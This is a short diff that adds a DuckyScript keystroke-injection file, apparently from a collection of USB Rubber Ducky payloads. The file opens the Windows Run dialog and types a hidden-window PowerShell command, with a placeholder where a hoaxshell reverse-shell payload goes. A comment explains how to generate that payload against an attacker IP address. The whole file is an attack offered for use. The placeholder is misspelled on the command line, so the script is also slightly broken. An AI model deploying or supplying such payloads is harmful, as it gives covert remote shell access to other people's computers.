@@ -1,0 +1,9 @@
+REM hoaxshell payload
+REM enter your shell payload at <PAYLOAD>
+REM created by iAmMujTaba004
+REM change you delay based on machine performance
+REM make your hoaxshell payload by command ./hoaxshell -s <IPADDRESS>
+GUI r
+DELAY 500
+STRING PowerShell.exe -WindowStyle hidden <PAYLAOD>
+DELAY 200
